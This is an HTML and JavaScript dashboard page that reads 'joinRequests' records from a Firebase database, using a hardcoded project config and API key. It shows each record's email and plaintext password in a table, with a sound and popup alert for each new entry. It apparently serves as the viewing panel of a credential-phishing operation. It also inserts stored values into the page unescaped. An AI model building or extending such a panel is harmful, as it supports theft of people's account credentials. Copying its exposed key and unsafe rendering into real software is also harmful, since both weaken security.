<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Collection</title>

<link rel="icon" href="../logo.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

<style>
body{
  margin:0;
  font-family:"Poppins",sans-serif;
  background: radial-gradient(circle at top, #1a0b0b, #050505);
  color:#fff;
}

/* SIDEBAR */
.dashboard-container{display:flex;min-height:100vh;}

.sidebar{
  width:280px;
  background:rgba(255,0,0,0.04);
  backdrop-filter:blur(28px);
  border-right:1px solid rgba(255,0,0,0.15);
  display:flex;
  flex-direction:column;
}

.logo{
  text-align:center;
  padding:20px;
  border-bottom:1px solid rgba(255,0,0,0.1);
}

.logo img{width:60px;border-radius:12px;}

.logo h2{color:#fca5a5;font-size:18px;}

.sidebar nav ul{list-style:none;padding:15px;margin:0;}

.sidebar nav ul li a{
  display:flex;
  gap:10px;
  padding:12px;
  color:#fecaca;
  text-decoration:none;
  border-radius:12px;
  transition:0.3s;
}

.sidebar nav ul li a:hover,
.sidebar nav ul li a.active{
  background:rgba(255,0,0,0.12);
  color:white;
  transform:translateX(5px);
}

/* MAIN */
.main-content{
  flex:1;
  padding:30px;
}

h1{margin-bottom:15px;}

#notifications{
  background:rgba(255,0,0,0.06);
  padding:12px;
  border-radius:12px;
  margin-bottom:15px;
}

/* TABLE */
table{
  width:100%;
  border-collapse:separate;
  border-spacing:0 10px;
}

thead th{
  text-align:left;
  color:#fca5a5;
  padding:10px;
}

tbody tr{
  background:rgba(255,0,0,0.04);
  backdrop-filter:blur(10px);
  transition:0.3s;
}

tbody tr:hover{
  transform:translateY(-3px);
  background:rgba(255,0,0,0.1);
}

td{padding:12px;}

/* BUTTON */
button{
  padding:8px 12px;
  border-radius:8px;
  border:1px solid rgba(255,0,0,0.3);
  background:rgba(255,0,0,0.1);
  color:#fca5a5;
  cursor:pointer;
}

button:hover{
  background:rgba(255,0,0,0.25);
  color:#fff;
}

/* POPUP */
.popup-alert{
  position:fixed;
  top:20px;
  right:20px;
  background:rgba(255,0,0,0.1);
  padding:12px;
  border-radius:10px;
  border:1px solid rgba(255,0,0,0.2);
  z-index:9999;
}

.delete-popup{
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  background:rgba(255,0,0,0.08);
  padding:20px;
  border-radius:15px;
  width:300px;
  text-align:center;
  z-index:9999;
}

.delete-popup div{
  display:flex;
  gap:10px;
  margin-top:15px;
}

.confirm-btn{
  background:rgba(34,197,94,0.2)!important;
  color:#86efac!important;
}

.cancel-btn{
  background:rgba(239,68,68,0.25)!important;
  color:#fecaca!important;
}
</style>
</head>

<body>

<div class="dashboard-container">

<!-- SIDEBAR -->
<aside class="sidebar">
  <div class="logo">
    <img src="../logo.png">
    <h2>Nahid</h2>
  </div>

  <nav>
    <ul>
      <li><a href="#"><i class="fas fa-home"></i> Dashboard</a></li>
      <li><a class="active"><i class="fas fa-layer-group"></i> Collection</a></li>
      <li><a href="#"><i class="fas fa-link"></i> Link</a></li>
    </ul>
  </nav>
</aside>

<!-- MAIN -->
<main class="main-content">
  <h1>Collection</h1>
  <div id="notifications"></div>

  <table>
    <thead>
      <tr>
        <th>Email</th>
        <th>Password</th>
        <th>Time</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>
</main>

</div>

<audio id="notifySound" src="./notify.mp3" preload="auto"></audio>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, onValue, onChildAdded, remove } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAFKdP00t5xf2V0WZmdYsE06razKxdhCJg",
  authDomain: "nahid-822a1.firebaseapp.com",
  databaseURL: "https://nahid-822a1-default-rtdb.firebaseio.com",
  projectId: "nahid-822a1",
  storageBucket: "nahid-822a1.firebasestorage.app",
  messagingSenderId: "371819940238",
  appId: "1:371819940238:web:87cd1c49819eefd62dfcdf",
  measurementId: "G-N1KLTDNTBZ"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const tableBody = document.querySelector("tbody");
const notifications = document.getElementById("notifications");
const sound = document.getElementById("notifySound");

/* SOUND FIX */
let soundUnlocked = false;

document.addEventListener("click", () => {
  if (!soundUnlocked) {
    sound.play().then(() => {
      sound.pause();
      sound.currentTime = 0;
      soundUnlocked = true;
    }).catch(()=>{});
  }
});

function playSound(){
  if(!soundUnlocked) return;
  sound.currentTime = 0;
  sound.play().catch(()=>{});
}

/* DATA */
const refData = ref(db, "joinRequests");
let isInitialLoad = true;

onValue(refData, (snap)=>{
  const data = snap.val();
  tableBody.innerHTML = "";

  if(!data){
    notifications.innerText = "No requests found";
    return;
  }

  const keys = Object.keys(data);
  notifications.innerText = keys.length + " requests found";

  keys.forEach(key=>{
    const d = data[key];

    tableBody.innerHTML += `
      <tr>
        <td>${d.email || ""}</td>
        <td>${d.password || ""}</td>
        <td>${d.timestamp ? new Date(d.timestamp).toLocaleString() : ""}</td>
        <td><button onclick="del('${key}')">Delete</button></td>
      </tr>
    `;
  });

  setTimeout(()=>isInitialLoad=false,500);
});

/* NEW DATA SOUND */
onChildAdded(refData,(snap)=>{
  if(isInitialLoad) return;

  const d = snap.val();

  playSound();

  const popup = document.createElement("div");
  popup.className="popup-alert";
  popup.innerText="New request: "+(d.email||"");
  document.body.appendChild(popup);

  setTimeout(()=>popup.remove(),3000);
});

/* DELETE */
window.del = function(key){
  const box = document.createElement("div");
  box.className="delete-popup";
  box.innerHTML=`
    <p>Delete this request?</p>
    <div>
      <button class="confirm-btn">Yes</button>
      <button class="cancel-btn">No</button>
    </div>
  `;
  document.body.appendChild(box);

  box.querySelector(".confirm-btn").onclick=()=>{
    remove(ref(db,"joinRequests/"+key));
    box.remove();
    playSound();
  };

  box.querySelector(".cancel-btn").onclick=()=>box.remove();
};
</script>

</body>
</html>
